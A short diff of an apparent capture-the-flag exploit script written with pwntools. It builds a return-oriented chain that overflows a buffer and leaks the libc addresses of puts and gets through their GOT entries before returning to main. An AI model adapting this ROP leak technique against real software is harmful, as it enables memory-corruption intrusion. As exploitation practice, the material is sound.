@@ -22,10 +22,13 @@ got_puts = p64(elf.got['puts'])
 got_gets = p64(elf.got['gets'])
 
 
+# Uses pop RDI twice because puts() takes 1 argument at a time, need to repeat
+
+
 payload = b'A'*offset
 payload += ret
 payload += pop_rdi + got_puts + plt_puts
-payload += pop_rdi + got_gets + plt_puts
+payload += pop_rdi + got_gets + plt_puts	
 payload += p64(elf.sym['main'])
 
 io.recvuntil('Go ahead \xf0\x9f\x98\x8f')
